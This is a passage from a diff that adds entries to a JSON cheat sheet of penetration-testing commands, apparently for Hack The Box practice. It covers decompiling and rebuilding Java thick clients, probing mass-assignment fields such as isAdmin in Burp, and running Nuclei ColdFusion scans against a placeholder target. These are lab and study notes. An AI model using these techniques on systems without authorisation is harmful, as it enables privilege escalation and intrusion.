+      "help_menu": "Why: thick clients often hide useful server routes and credentials in traffic, not just in code.\nRecord: target host, port, login flow, and any custom protocol behavior.",
+      "reference_label": "Wireshark",
+      "reference_url": "https://www.wireshark.org/docs/"
+    },
+    {
+      "path": "Validation & Attack Surface",
+      "module": "Thick Client & Code Review",
+      "tool": "JD-GUI",
+      "platform": "Desktop",
+      "type": "Command",
+      "title": "Open a Java Client for Source Review",
+      "description": "Use JD-GUI for quick visual review of JAR or CLASS files when a Java thick client needs manual inspection.",
+      "command": "jd-gui <JAR_FILE>",
+      "tip": "Search for hostnames, ports, credentials, serializers, and request builders before changing code.",
+      "tags": [
+        "htb-common-apps",
+        "thick-client",
+        "java",
+        "decompile"
+      ],
+      "help_menu": "Why: JD-GUI is fast for orientation and source browsing.\nUse with: traffic captures so you can tie methods back to real requests.",
+      "reference_label": "JD-GUI",
+      "reference_url": "https://github.com/java-decompiler/jd-gui"
+    },
+    {
+      "path": "Validation & Attack Surface",
+      "module": "Thick Client & Code Review",
+      "tool": "jadx",
+      "platform": "Linux",
+      "type": "Command",
+      "title": "Decompile Java or Android Artifacts to a Folder",
+      "description": "Use jadx when you want searchable decompiled output from JAR, CLASS, APK, DEX, or related archive formats.",
+      "command": "jadx -d jadx-out <JAR_FILE>",
+      "tip": "No decompiler is perfect. Use output as a map, then confirm behavior with runtime traffic and targeted tests.",
+      "tags": [
+        "htb-common-apps",
+        "thick-client",
+        "decompile",
+        "jadx"
+      ],
+      "help_menu": "Why: searchable output is easier to grep, diff, and annotate than GUI-only review.\nLook for: endpoints, auth material, crypto handling, and file operations.",
+      "reference_label": "jadx",
+      "reference_url": "https://github.com/skylot/jadx"
+    },
+    {
+      "path": "Validation & Attack Surface",
+      "module": "Thick Client & Code Review",
+      "tool": "JDK tools",
+      "platform": "Linux",
+      "type": "Command",
+      "title": "Inspect a JAR Manifest and Contents",
+      "description": "Use JDK tooling to list archive contents and pull the manifest before rebuilding or patching a Java client.",
+      "command": "jar tf <JAR_FILE> | sed -n \"1,120p\" && jar xf <JAR_FILE> META-INF/MANIFEST.MF && sed -n \"1,120p\" META-INF/MANIFEST.MF",
+      "tip": "The manifest often explains the main class and signing state before you touch any bytecode.",
+      "tags": [
+        "htb-common-apps",
+        "thick-client",
+        "java",
+        "jar"
+      ],
+      "help_menu": "Why: changing a signed JAR without understanding the manifest and META-INF files creates avoidable errors.\nRecord: Main-Class, classpath, and signature files.",
+      "reference_label": "OpenJDK tools",
+      "reference_url": "https://openjdk.org/tools/"
+    },
+    {
+      "path": "Validation & Attack Surface",
+      "module": "Thick Client & Code Review",
+      "tool": "JDK tools",
+      "platform": "Linux",
+      "type": "Command",
+      "title": "Compile and Rebuild a Modified Java Client",
+      "description": "Compile a changed class against the original client and rebuild a JAR after controlled source edits in a lab.",
+      "command": "javac -cp <JAR_FILE> <CLASS_FILE> && jar -cmf META-INF/MANIFEST.MF rebuilt-client.jar -C raw .",
+      "tip": "Make one change at a time and test that the client still launches before moving to vulnerability validation.",
+      "tags": [
+        "htb-common-apps",
+        "thick-client",
+        "java",
+        "rebuild"
+      ],
+      "help_menu": "Why: HTB thick-client workflows often require small client-side changes to reach hidden server behavior.\nCheck: Java version, package paths, manifest newline, and removed stale signature files.",
+      "reference_label": "OpenJDK tools",
+      "reference_url": "https://openjdk.org/tools/"
+    },
+    {
+      "path": "Exploitation & Access",
+      "module": "Injection & Input Exploitation",
+      "tool": "Burp Suite",
+      "platform": "Browser",
+      "type": "Workflow",
+      "title": "Probe Mass Assignment Fields",
+      "description": "Replay a normal JSON or form request while adding role, state, price, owner, or permission-style fields one at a time.",
+      "command": "In Repeater, compare the baseline request with added fields like isAdmin, role, accountType, price, owner_id, or status, then verify persisted state separately",
+      "tip": "Mass assignment is about server-side binding. A reflected field is not enough; confirm that state actually changed.",
+      "tags": [
+        "htb-common-apps",
+        "mass-assignment",
+        "burp",
+        "api"
+      ],
+      "help_menu": "Why: HTB mass-assignment style bugs usually come from hidden model fields accepted by the server.\nValidate: create, update, read-back, and authorization boundaries.",
+      "reference_label": "PortSwigger Docs",
+      "reference_url": "https://portswigger.net/burp/documentation/desktop"
+    },
+    {
+      "path": "Validation & Attack Surface",
+      "module": "Focused Vulnerability Checks",
+      "tool": "Nuclei",
+      "platform": "Linux",
+      "type": "Command",
+      "title": "Run ColdFusion-Focused Templates",
+      "description": "Use tag-filtered Nuclei templates as a low-friction ColdFusion validation pass after fingerprinting CFIDE or Adobe ColdFusion clues.",
+      "command": "nuclei -u https://<TARGET>/ -tags coldfusion -severity medium,high,critical -o nuclei-coldfusion.txt",
+      "tip": "Keep template output as leads and manually confirm version, endpoint, and exploitability.",
+      "tags": [
+        "htb-common-apps",
+        "coldfusion",
+        "nuclei",
+        "templates"
+      ],
+      "help_menu": "Why: ColdFusion surfaces are version-sensitive and template output needs careful confirmation.\nUse after: WhatWeb/httpx fingerprints, CFIDE path checks, and scope review.",
+      "reference_label": "Nuclei",
+      "reference_url": "https://github.com/projectdiscovery/nuclei"
     }
   ]
 }
